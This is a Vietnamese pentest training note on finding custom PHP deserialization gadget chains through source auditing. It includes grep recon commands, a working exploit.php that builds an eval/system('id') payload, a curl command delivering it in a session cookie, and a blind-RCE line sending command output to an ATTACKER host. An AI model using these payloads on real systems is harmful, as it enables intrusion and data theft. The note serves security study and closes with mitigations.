---
title: "06. PHP Source Code Auditing — Custom Gadget Chain Discovery"
type: attack
tags: [pentest, deserialization, php, source-audit, gadget-chain, whitebox, lesson-06]
aliases: [PHP Source Audit, Custom Gadget Chain]
created: 2026-04-05
---

> **Prerequisites**: [[03-php-pop-chains|03. PHP POP Chain Construction]]
> **Objectives**:
> - Methodology audit source code để tìm gadget chain khi PHPGGC không có sẵn
> - Trace call graph thủ công từ magic method đến sink
> - Dùng grep/AST tools để scan codebase hiệu quả
> - Biết khi nào nên audit thủ công vs dùng PHPGGC

---

## Điều kiện khai thác

> [!note] Khi nào cần audit thủ công?
> - Framework/library không có chain trong PHPGGC
> - Application dùng custom framework tự viết
> - PHPGGC chains không work (version mismatch, thư viện đã patch)
> - Cần hiểu sâu chain để customize (bypass WAF, tránh detection)

> [!tip] White-box vs Black-box
> Source code audit là white-box technique. Trong black-box, có thể kết hợp: đoán framework từ fingerprinting → thử PHPGGC chains → nếu fail, tìm cách đọc source (LFI, git exposure, backup files).

---

## Cơ chế tấn công

### Methodology tổng quan

![[assets/img-06-source-audit-flow.png]]
*Hình 1: Ba bước audit: xác định entry gadgets → trace call graph → reach dangerous sink. Tools và grep patterns cho từng bước*

### Taxonomy của gadgets theo chức năng

```text
ENTRY GADGETS (auto-triggered):
  __wakeup()    → gọi ngay khi unserialize() kết thúc
  __destruct()  → gọi khi object bị destroy (script end, scope exit)
  __toString()  → khi object dùng như string (echo, "." concat, sprintf...)
  __call()      → khi method không tồn tại được gọi
  __invoke()    → khi object được gọi như function: $obj()

PROPAGATION GADGETS (chuyển tiếp control):
  getter/setter thông qua __get()/__set()
  ArrayAccess::offsetGet() khi $obj['key']
  Iterator::current()/next() khi foreach($obj)
  Countable::count() khi count($obj)

SINK GADGETS (đích đến):
  eval() / assert($string)     → Code execution
  system() / exec() / ...      → OS command
  include() / require()        → File inclusion
  file_put_contents()          → File write
  curl_exec() / file_get_contents(URL) → SSRF
  unlink() / rename()          → File system manipulation
  preg_replace('/e', ...)      → PHP < 7 code exec (deprecated)
```

---

## Quy trình tấn công

**Môi trường giả định**: Custom PHP application không dùng framework chuẩn, có source code access (hoặc lộ qua LFI).

### Phase 1 — Reconnaissance & Entry Points

**Bước 1 — Tìm unserialize entry points**

```bash
# Tìm tất cả calls đến unserialize()
grep -rPn "unserialize\s*\(" --include="*.php" /var/www/ 2>/dev/null

# Filter: chỉ lấy lines có user input (không phải hardcoded string)
grep -rPn "unserialize\s*\(\s*\$" --include="*.php" /var/www/ 2>/dev/null

# Tìm cả những unserialize ẩn sau decode/decrypt
grep -rPn "unserialize\s*\(\s*(base64_decode|hex2bin|gzinflate|openssl_decrypt)" \
    --include="*.php" /var/www/ 2>/dev/null
```

> **Expected output**: Danh sách files + line numbers với unserialize calls.

**Bước 2 — Liệt kê tất cả classes trong scope**

```bash
# Tìm tất cả class definitions
grep -rPn "^class\s+\w+" --include="*.php" /var/www/ 2>/dev/null | \
    awk -F: '{print $1, $3}' | sort -u

# List autoloaded classes (Composer)
php -r "
\$map = include '/var/www/vendor/composer/autoload_classmap.php';
foreach(\$map as \$class => \$path) {
    echo \$class . ' => ' . \$path . PHP_EOL;
}" 2>/dev/null | head -50

# Đếm classes
grep -rPn "^class\s" --include="*.php" /var/www/ | wc -l
```

**Bước 3 — Tìm tất cả magic methods**

```bash
# Tìm magic methods kèm class context
grep -rPn -B5 "function\s+__(wakeup|destruct|toString|call|invoke|get|set)\s*\(" \
    --include="*.php" /var/www/ 2>/dev/null | grep -E "^--|^.*class|function __"

# Output gọn hơn — chỉ file:line:content
grep -rPn "function\s+__(wakeup|destruct|toString|call|invoke)\s*\(" \
    --include="*.php" /var/www/ 2>/dev/null
```

> **Expected output**: List các files chứa magic methods → đây là entry gadget candidates.

### Phase 2 — Call Graph Tracing

**Bước 4 — Đọc entry gadget và trace**

```php
// Ví dụ: tìm được class này
class EventDispatcher {
    protected $listeners;  // array hoặc object?

    public function __destruct() {
        foreach ($this->listeners as $listener) {
            $listener->onShutdown();  // ← $listener là gadget tiếp theo
        }
    }
}
```

```bash
# Tìm class có method onShutdown()
grep -rPn "function\s+onShutdown\s*\(" --include="*.php" /var/www/

# Tìm class implements một interface có onShutdown()
grep -rPn "interface.*{" --include="*.php" /var/www/ | \
    xargs grep -l "onShutdown" 2>/dev/null
```

**Bước 5 — Trace tiếp theo từng hop**

```php
// Tìm được:
class FileCleanup implements ShutdownListener {
    public $filePath;
    public $logger;

    public function onShutdown() {
        $this->logger->log("Cleaning: " . $this->filePath);  // __toString trigger
        unlink($this->filePath);                               // sink candidate
    }
}
```

```bash
# Tìm class có __toString() gọi dangerous code
grep -rPn "function\s+__toString" --include="*.php" /var/www/ -A 10 | \
    grep -E "eval|system|exec|include|file_put|curl"

# Hoặc tìm class có log() chứa code nguy hiểm
grep -rPn "function\s+log\s*\(" --include="*.php" /var/www/ -A 15 | \
    grep -E "eval|system|exec|include"
```

**Bước 6 — Document chain hoàn chỉnh**

```text
Chain tìm được:
1. EventDispatcher.__destruct()
   → foreach $this->listeners as $listener
   → $listener->onShutdown()

2. FileCleanup.onShutdown()
   → unlink($this->filePath)   [SINK — xóa file]
   → $this->logger->log(str)   [trigger __toString on logger]

3. MaliciousLogger.__toString()  [nếu tìm được class phù hợp]
   → eval($this->template)      [SINK — RCE]

Attacker controls:
- EventDispatcher.$listeners = [FileCleanup object]
- FileCleanup.$filePath = (không quan trọng nếu target là RCE)
- FileCleanup.$logger = MaliciousLogger object  
- MaliciousLogger.$template = 'system("id");'
```

### Phase 3 — Exploit Development

**Bước 7 — Viết exploit script**

```php
<?php
// exploit.php
// Copy class skeletons — chỉ cần properties

class EventDispatcher {
    protected $listeners;
    public function __construct($listeners) {
        $this->listeners = $listeners;
    }
}

class FileCleanup {
    public $filePath;
    public $logger;
    public function __construct($logger) {
        $this->filePath = '/tmp/dummy';
        $this->logger = $logger;
    }
}

class MaliciousLogger {
    public $template;
    public function __construct($cmd) {
        $this->template = "system('$cmd');";
    }
}

// Build chain từ sink → entry
$logger  = new MaliciousLogger('id');
$cleanup = new FileCleanup($logger);
$entry   = new EventDispatcher([$cleanup]);

$payload = serialize($entry);

echo "=== Payload ===\n$payload\n\n";
echo "=== Base64 ===\n" . base64_encode($payload) . "\n";
```

**Bước 8 — Test locally trước khi gửi**

```bash
# Test chain locally
php -r "
// Include class definitions từ target
spl_autoload_register(function(\$c) {
    include '/var/www/classes/' . \$c . '.php';
});
\$payload = base64_decode('...');
unserialize(\$payload);
"
```

> **Expected output**: Command `id` được thực thi locally → chain hoạt động.

**Bước 9 — Deliver và verify**

```bash
# Gửi payload
PAYLOAD=$(php exploit.php | grep "Base64" -A1 | tail -1)
curl -b "session=$PAYLOAD" http://target.com/

# Verify blind RCE
php exploit.php <<< "curl http://ATTACKER/?x=\$(id|base64)"
```

---

## Biến thể & Bypass

### Dùng Semgrep để auto-scan sinks

```bash
# Cài semgrep
pip3 install semgrep

# Scan PHP sinks
semgrep --config "p/php" /var/www/ --json | \
    python3 -c "
import json,sys
data = json.load(sys.stdin)
for r in data['results']:
    if any(s in r['check_id'] for s in ['exec','eval','include']):
        print(r['path'], r['start']['line'], r['check_id'])
"
```

### Dùng PHP-Parser để build AST

```bash
# Cài nikic/php-parser
composer require nikic/php-parser --dev

# Script tìm magic methods + trace
php -r "
require 'vendor/autoload.php';
use PhpParser\NodeFinder;
use PhpParser\ParserFactory;

\$parser = (new ParserFactory)->create(ParserFactory::PREFER_PHP7);
\$finder = new NodeFinder;

\$code = file_get_contents('TargetClass.php');
\$stmts = \$parser->parse(\$code);

// Tìm tất cả method definitions
\$methods = \$finder->findInstanceOf(\$stmts, PhpParser\Node\Stmt\ClassMethod::class);
foreach (\$methods as \$m) {
    if (str_starts_with(\$m->name->name, '__')) {
        echo \$m->name->name . PHP_EOL;
    }
}
"
```

### Tìm gadgets trong Composer packages

```bash
# Nhiều gadgets nằm trong vendor/ (không phải code app)
grep -rPn "function\s+__(destruct|wakeup|toString)" \
    /var/www/vendor/ --include="*.php" 2>/dev/null | \
    grep -v test | grep -v Test | head -30

# Focus vào popular packages
for pkg in guzzlehttp symfony laravel monolog swiftmailer; do
    echo "=== $pkg ==="
    grep -rPn "function\s+__destruct" "/var/www/vendor/$pkg/" \
        --include="*.php" 2>/dev/null | head -5
done
```

---

## Cây quyết định

```mermaid
flowchart TD
    A[PHPGGC không có chain cho target?] -->|Đúng| B[Source code available?]
    A -->|Sai| Z1[Dùng PHPGGC — xem Lesson 05]
    B -->|Có| C[Phase 1: Tìm unserialize entry + classes]
    B -->|Không| D{Có thể lấy source không?}
    D -->|LFI available| E[Đọc source qua LFI]
    D -->|Git exposed| F[Clone git repo: /.git/]
    D -->|Backup files| G[Thử .bak, ~, .swp extensions]
    D -->|Không có cách nào| H[Black-box: thử all PHPGGC chains]
    E --> C
    F --> C
    G --> C
    C --> I[Grep magic methods trong scope]
    I --> J[Read entry gadget — trace $this->prop->method()]
    J --> K{Prop là object với method chứa gì?}
    K -->|Calls another method on its prop| J
    K -->|Calls dangerous function| L[Sink found!]
    K -->|Uses prop as string| M[Look for __toString on that class]
    M --> K
    L --> N[Document chain: Entry → Hops → Sink]
    N --> O[Write exploit PHP script]
    O --> P[Test locally]
    P --> Q[Deliver to target]
```

---

## Command Cheatsheet

**Reconnaissance commands**

```bash
# Full audit scan — one-liner
grep -rPn "unserialize\s*\(\s*\$\|function\s+__(wakeup|destruct|toString|call|invoke)\|eval\s*\(\|system\s*\(\|file_put_contents\s*\(" \
    --include="*.php" /var/www/ 2>/dev/null | grep -v "/vendor/\|\.min\." | tee audit.txt

# Magic methods với class context (5 lines before = class declaration)
grep -rPn -B5 "function\s+__(wakeup|destruct|toString)\s*\(" \
    --include="*.php" /var/www/ 2>/dev/null | \
    grep -E "^.*class |function __" | paste - -

# Dangerous sinks
grep -rPn "\beval\s*(\|\bsystem\s*(\|\bexec\s*(\|\bpassthru\s*(\|\bshell_exec\s*(\|\bfile_put_contents\s*(\|\binclude\s*\$\|\brequire\s*\$" \
    --include="*.php" /var/www/ 2>/dev/null
```

**Tracing tools**

```bash
# Tìm class với method cụ thể
grep -rPn "function\s+METHOD_NAME\s*\(" --include="*.php" /var/www/

# Tìm tất cả usages của một property
grep -rPn "\$this->PROP_NAME" --include="*.php" /var/www/

# Tìm interface/abstract implementations
grep -rPn "implements\s+INTERFACE\|extends\s+CLASS" --include="*.php" /var/www/
```

---

## Daily Drill

**Thời gian**: 25 phút/ngày trong 10 ngày đầu.

**Drill 1 — Speed grep**
Mục tiêu: chạy full audit scan và đọc kết quả trong dưới 2 phút.

```bash
# Mỗi ngày: clone một PHP project từ GitHub và chạy scan
git clone https://github.com/some/php-app /tmp/target
grep -rPn "function\s+__(wakeup|destruct|toString)" --include="*.php" /tmp/target/
# Đọc kết quả và map potential entry gadgets
```

Luyện cho đến khi: đọc grep output và identify entry gadgets trong dưới 1 phút.

**Drill 2 — Trace chain từ magic method**
Mục tiêu: đọc một class với magic method và trace chain đến 2 hops tiếp theo.

```bash
# Mỗi ngày lấy một chain từ PHPGGC source và trace ngược:
cat /usr/share/phpggc/gadgetchains/Laravel/RCE/1/chain.php
# Câu hỏi: entry gadget là gì? Hop 1? Hop 2? Sink ở đâu?
```

Luyện cho đến khi: trace 2-hop chain trong dưới 3 phút.

**Drill 3 — Write exploit từ chain document**
Mục tiêu: từ chain documentation viết exploit PHP script.

```text
Cho: Entry = ClassA.__destruct() → $this->handler->run()
     Hop 1 = ClassB.run() → eval($this->code)
     Sink  = eval() với attacker-controlled $this->code
→ Viết exploit.php tạo serialized payload thực thi 'id'
```

Luyện cho đến khi: viết exploit script trong dưới 3 phút.

---

## Phát hiện & Phòng thủ

> [!warning] Detection Indicators
> **SAST tools**: Deploy PHPStan/Psalm với custom rules tìm unserialize với user input
>
> **Code review checklist**: Audit mọi `unserialize()` call trong PR review process

> [!note] Mitigation
> - Sử dụng `allowed_classes` parameter trong `unserialize()` để whitelist
> - Dùng HMAC signature trên serialized data
> - Thay thế serialization bằng JSON (không trigger magic methods)
> - Implement custom `__wakeup()` để validate object state

---

## Lab Thực hành

| Platform | Machine/Lab | Tại sao phù hợp |
|----------|-------------|-----------------|
| PortSwigger | **Developing a custom gadget chain for PHP deserialization** | Lab chính thức yêu cầu audit source |
| HTB | **Tenet** (Retired) | Custom plugin source audit |
| DVWA | Custom lab | Setup vulnerable PHP app local |
| GitHub | PHP open-source projects | Practice audit trên real code |

Làm PortSwigger lab trước vì có hướng dẫn chi tiết. Sau đó practice trên real PHP projects từ GitHub.
